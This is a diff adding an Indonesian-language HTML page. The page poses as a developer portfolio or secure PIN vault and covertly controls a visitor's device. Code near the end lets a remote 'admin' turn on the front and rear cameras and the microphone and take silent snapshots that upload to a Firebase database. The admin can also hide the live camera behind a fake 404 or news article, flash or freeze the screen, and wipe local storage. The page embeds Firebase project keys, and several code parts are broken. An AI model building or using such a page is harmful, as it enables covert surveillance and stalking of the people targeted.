@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Verifikasi Akses</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --bg-dark: #050608; --neon-gold: #c5a880; --neon-red: #ef4444; --border-cyber: rgba(197, 168, 128, 0.2); --font-mono: 'Courier New', monospace; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+        body { background: var(--bg-dark); color: #fff; overflow: hidden; height: 100vh; width: 100vw; position: relative; }
+
+        /* LAYER MASYARAKAT / REPOSITORI INAKTIF (FAKE PORTFOLIO MASK) */
+        #passivePortfolioLayer { position: fixed; inset:0; z-index: 1000; background:#f3f4f6; color:#1f2937; display:none; flex-direction:column; overflow-y:auto; padding:30px; }
+        
+        /* LAYER 1: KAMUFLASE AWAL (PIN VAULT) */
+        #camouflageLayer { position: fixed; inset: 0; z-index: 500; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .pin-dot-container { display: flex; gap: 15px; margin: 30px 0; }
+        .pin-dot { width: 15px; height: 15px; border-radius: 50%; border: 2px solid #444; background: transparent; transition: all 0.2s; }
+        .pin-dot.filled { background: var(--neon-gold); border-color: var(--neon-gold); box-shadow: 0 0 10px rgba(197, 168, 128, 0.5); }
+        .numpad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 280px; width: 100%; }
+        .numpad-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; font-size: 1.5rem; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+        
+        /* LAYER 2: INTERFAS CORE COMMS */
+        #commsLayer { position: fixed; inset: 0; z-index: 100; display: none; flex-direction: column; background: #000; }
+        .video-container { flex: 1; position: relative; overflow: hidden; background: #050505; }
+        #localVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .status-badge { position: absolute; top: 20px; left: 20px; background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 20px; border: 1px solid var(--neon-red); color: var(--neon-red); font-family: var(--font-mono); font-size: 0.7rem; font-weight: bold; backdrop-filter: blur(5px); z-index:10; }
+        .chat-container { height: 42vh; background: rgba(10, 12, 16, 0.98); border-top: 1px solid var(--border-cyber); display: flex; flex-direction: column; }
+        #chatStream { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .chat-bubble { max-width: 85%; padding: 10px 14px; border-radius: 12px; font-size: 0.85rem; line-height: 1.4; animation: popIn 0.25s forwards; }
+        .chat-admin { background: rgba(197, 168, 128, 0.15); border: 1px solid var(--neon-gold); color: #fff; align-self: flex-start; border-bottom-left-radius: 2px; }
+        .chat-self { background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); color: #ccc; align-self: flex-end; border-bottom-right-radius: 2px; }
+        .chat-input-area { padding: 10px 15px; background: #000; border-top: 1px solid rgba(255,255,255,0.05); display: flex; gap: 10px; }
+        .input-box { flex: 1; background: rgba(255,255,255,0.08); border: none; border-radius: 20px; padding: 12px 18px; color: #fff; font-size: 0.9rem; outline: none; }
+        .send-btn { background: var(--neon-gold); color: #000; border: none; width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+        /* REAL-TIME HIJACK DISGUISE LAYERS */
+        #hijack404Layer { position: fixed; inset: 0; z-index: 400; background: #fff; color: #202124; font-family: arial, sans-serif; padding: 30px; display: none; }
+        #hijackArticleLayer { position: fixed; inset: 0; z-index: 400; background: #fafafa; color: #111; padding: 20px; overflow-y: auto; display: none; font-family: sans-serif; }
+
+        /* WEAPONS LAYER */
+        #flashbangLayer { position: fixed; inset: 0; z-index: 9999; background: #fff; opacity: 0; pointer-events: none; transition: opacity 0.1s; }
+        #paralysisLayer { position: fixed; inset: 0; z-index: 9998; background: transparent; display: none; }
+        @keyframes popIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <script>
+        const firebaseConfig = {
+    apiKey: "AIzaSyD1O3z2mw3fKorKAAqI3ZMZz9qlNnZqKE4",
+    authDomain: "bagantara-id.firebaseapp.com",
+    databaseURL: "https://bagantara-id-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "bagantara-id",
+    storageBucket: "bagantara-id.firebasestorage.app",
+    messagingSenderId: "76112622878",
+    appId: "1:76112622878:web:d4800368f06e1cc04c450f"
+};
+if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+window.database = firebase.database();
+window.auth = firebase.auth();
+    </script>
+
+    <div id="passivePortfolioLayer">
+        <h1 style="font-size: 1.8rem; margin-bottom: 5px;">Ahmed</h1>
+        <p style="color:#6b7280; font-size:0.9rem; margin-bottom:20px;">Portofolio Integrasi Pustaka WebRTC & Javascript Sandbox</p>
+        <hr style="border:none; border-top:1px solid #e5e7eb; margin-bottom:20px;">
+        <h3 style="margin-bottom:8px;">Proyek Laboratorium Terbuka:</h3>
+        <div style="background:#fff; padding:15px; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); margin-bottom:15px;">
+            <h4 style="color:#2563eb;">Sistem Validasi Token Sesi Protokol</h4>
+            <p style="font-size:0.8rem; color:#4b5563; margin-top:4px;">Eksperimen routing token data searah menggunakan Realtime Stream. Sesi kosong atau tidak membawa kunci otorisasi valid akan secara otomatis mengunci gerbang DOM.</p>
+        </div>
+        <p style="font-size:0.75rem; color:#9ca3af; text-align:center; margin-top:auto;">&copy; 2026 Ahmed. Laboratorium Terbuka Open-Source.</p>
+    </div>
+
+    <div id="camouflageLayer">
+        <i class="fa-solid fa-shield-halved" style="font-size: 2.8rem; color: var(--neon-gold); margin-bottom: 10px;"></i>
+        <h2 style="font-family: var(--font-mono); font-size: 1rem; color: var(--neon-gold); letter-spacing: 2px;">SECURE VAULT</h2>
+        <p style="color: #555; font-size: 0.75rem; margin-top: 4px;">Entry Passcode Verification</p>
+        <div class="pin-dot-container">
+            <div class="pin-dot" id="dot-1"></div><div class="pin-dot" id="dot-2"></div><div class="pin-dot" id="dot-3"></div><div class="pin-dot" id="dot-4"></div>
+        </div>
+        <div class="numpad-grid">
+            ${[1,2,3,4,5,6,7,8,9].map(n => `<div class="numpad-btn" onclick="pressPin(${n})">${n}</div>`).join('')}
+            <div class="numpad-btn" style="background:transparent; color:#ef4444;" onclick="clearPin()"><i class="fa-solid fa-delete-left"></i></div>
+            <div class="numpad-btn" onclick="pressPin(0)">0</div>
+            <div class="numpad-btn" style="background:transparent; color:var(--neon-gold);" onclick="submitPin()"><i class="fa-solid fa-check"></i></div>
+        </div>
+    </div>
+
+    <div id="commsLayer">
+        <div class="video-container">
+            <video id="localVideo" autoplay muted playsinline></video>
+            <div class="status-badge"><i class="fa-solid fa-circle fa-beat"></i> CRYPTO JUMPER ENABLED</div>
+        </div>
+        <div class="chat-container">
+            <div id="chatStream"></div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" class="input-box" placeholder="Kirim balasan biner...">
+                <button class="send-btn" onclick="sendChat()"><i class="fa-solid fa-paper-plane"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="hijack404Layer">
+        <div style="max-width:500px; margin: 12% auto 0 auto;">
+            <p style="font-size:20px; font-weight:bold; margin:0 0 10px 0;"><b>404.</b> <span style="color:#5f6368">That's an error.</span></p>
+            <p style="font-size:14px; line-height:1.6;">The requested URL was not found on this server. <span style="color:#5f6368">That's all we know.</span></p>
+        </div>
+    </div>
+
+    <div id="hijackArticleLayer">
+        <div style="max-width:600px; margin:0 auto; padding-top:20px;">
+            <span style="color:#ef4444; font-size:0.75rem; font-weight:bold; letter-spacing:1px;">TEKNOLOGI GLOBAL</span>
+            <h1 style="font-size:1.6rem; margin:8px 0 12px 0; line-height:1.3;">Pembaruan Masif Sistem Komparasi Cloud Serverless 2026</h1>
+            <p style="font-size:0.9rem; color:#444; line-height:1.6; margin-bottom:15px;">Disruptif arsitektur serverless diklaim menghemat biaya operasional hingga 40%. Penggunaan database real-time kian diminati oleh pengembang aplikasi seluler skala besar karena kecepatan sinkronisasi node-nya.</p>
+            <p style="font-size:0.9rem; color:#444; line-height:1.6;">Beberapa praktisi menyarankan pembatasan aturan otorisasi server ketat guna mengantisipasi kebocoran kunci API yang berpotensi dieksploitasi pihak luar.</p>
+        </div>
+    </div>
+
+    <div id="flashbangLayer"></div>
+    <div id="paralysisLayer"></div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionToken = urlParams.get('token');
+        let currentStream = null, isCamouflageActive = true, pinCount = 0;
+
+        const executeScorchedEarth = () => {
+            document.body.innerHTML = ''; localStorage.clear(); sessionStorage.clear();
+            window.location.replace('https://www.google.com');
+        };
+
+        // PROTOKOL MASKE: JIKA DIBUKA TANPA TOKEN, SUNTIK SKRIN RESUME PORTOFOLO BIASA (ANTI-CURIGA REPO)
+        if (!sessionToken) {
+            document.getElementById('camouflageLayer').style.display = 'none';
+            document.getElementById('passivePortfolioLayer').style.display = 'flex';
+            throw new Error("[PROTEKSI KERNEL] Sesi dibekukan. Aliran dihentikan.");
+        }
+
+        const refSession = db.ref(`burner_comms/${sessionToken}`);
+        refSession.once('value').then(snap => {
+            if (!snap.exists()) {
+                // Token salah / kadaluwarsa -> Buka Resume palsu juga agar dikira link rusak biasa
+                document.getElementById('camouflageLayer').style.display = 'none';
+                document.getElementById('passivePortfolioLayer').style.display = 'flex';
+                return;
+            }
+            if (snap.val().initialPIN === false) unlockVault();
+        });
+
+        // PIN Logika
+        function pressPin(n) { if (pinCount < 4) { pinCount++; document.getElementById(`dot-${pinCount}`).classList.add('filled'); } }
+        function clearPin() { if (pinCount > 0) { document.getElementById(`dot-${pinCount}`).classList.remove('filled'); pinCount--; } }
+        function submitPin() { if (pinCount === 4) unlockVault(); }
+
+        function unlockVault() {
+            isCamouflageActive = false;
+            document.getElementById('camouflageLayer').style.display = 'none';
+            document.getElementById('commsLayer').style.display = 'flex';
+            startCamera('user'); listenToAdminArsenal(); listenToPhantomChats();
+        }
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden && !isCamouflageActive) {
+                db.ref(`burner_comms/${sessionToken}/system_logs`).push({
+                    action: "TARGET MENINGGALKAN SCREEN (TAB-BLUR). BERKAS DIHANCURKAN.", timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                executeScorchedEarth();
+            }
+        });
+
+        function startCamera(facing) {
+            if (currentStream) currentStream.getTracks().forEach(t => track.stop());
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true }).then(stream => {
+                currentStream = stream; const v = document.getElementById('localVideo'); v.srcObject = stream;
+                v.style.transform = facing === 'environment' ? 'none' : 'scaleX(-1)';
+            }).catch(e => alert("Akses kamera wajib disetujui."));
+        }
+
+        // ==========================================
+        // PENERIMA PERINTAH SENJATA & TRANSMISI UTALITAS DOM HIJACK
+        // ==========================================
+        function listenToAdminArsenal() {
+            // A. Pantau Pembajakan Antarmuka Real-Time (DOM Hijacking)
+            refSession.child('camouflageMode').on('value', snap => {
+                if(!snap.exists()) return;
+                const mode = snap.val();
+                
+                // Reset Semua Layer Hijack Terlebih Dahulu
+                document.getElementById('hijack404Layer').style.display = 'none';
+                document.getElementById('hijackArticleLayer').style.display = 'none';
+                document.getElementById('commsLayer').style.opacity = '1';
+                
+                if (mode === 'FAKE_404') {
+                    document.getElementById('hijack404Layer').style.display = 'block';
+                    document.getElementById('commsLayer').style.opacity = '0'; // Sembunyikan tapi kamera tetap On
+                } else if (mode === 'FAKE_ARTICLE') {
+                    document.getElementById('hijackArticleLayer').style.display = 'block';
+                    document.getElementById('commsLayer').style.opacity = '0';
+                }
+            });
+
+            // B. Pantau Tembakan Senjata Taktis
+            refSession.child('commands').on('value', snap => {
+                if (!snap.exists()) return; const cmd = snap.val();
+                if (cmd.type === 'SCORCHED_EARTH') executeScorchedEarth();
+                else if (cmd.type === 'FLASHBANG') {
+                    const fb = document.getElementById('flashbangLayer'); fb.style.opacity = '1';
+                    setTimeout(() => { fb.style.opacity = '0'; }, 3000);
+                }
+                else if (cmd.type === 'PARALYSIS') document.getElementById('paralysisLayer').style.display = 'block';
+                else if (cmd.type === 'REAR_CAM_HIJACK') startCamera('environment');
+                else if (cmd.type === 'SILENT_SNAP') {
+                    const video = document.getElementById('localVideo'); const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    db.ref(`burner_comms/${sessionToken}/chats`).push({
+                        sender: 'TARGET_SNAP', text: '[SILENT_SNAP_RESULT]', image_base64: canvas.toDataURL('image/jpeg', 0.75), timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            });
+        }
+
+        function listenToPhantomChats() {
+            const box = document.getElementById('chatStream');
+            refSession.child('chats').on('child_added', snap => {
+                const msg = snap.val(); if (msg.sender === 'TARGET_SNAP') return;
+                const div = document.createElement('div'); const isAdmin = msg.sender === 'ADMIN';
+                div.className = `chat-bubble ${isAdmin ? 'chat-admin' : 'chat-self'}`;
+                if (msg.image_base64) {
+                    div.innerHTML = `<img src="${msg.image_base64}" style="max-width:100%; border-radius:6px; transition:filter 0.3s;" onclick="this.style.filter='blur(20px)'; setTimeout(()=>this.remove(),2500);"><small style="display:block; text-align:center; font-size:0.6rem; color:var(--neon-gold); margin-top:4px;"><i class="fa-solid fa-eye"></i> 3 DETIK</small>`;
+                } else { div.textContent = msg.text; }
+                box.appendChild(div); box.scrollTop = box.scrollHeight;
+            });
+        }
+
+        function sendChat() {
+            const input = document.getElementById('chatInput'); const text = input.value.trim(); if (!text) return;
+            db.ref(`burner_comms/${sessionToken}/chats`).push({ sender: 'TARGET', text: text, timestamp: firebase.database.ServerValue.TIMESTAMP });
+            input.value = '';
+        }
+    </script>
+</body>
+</html>
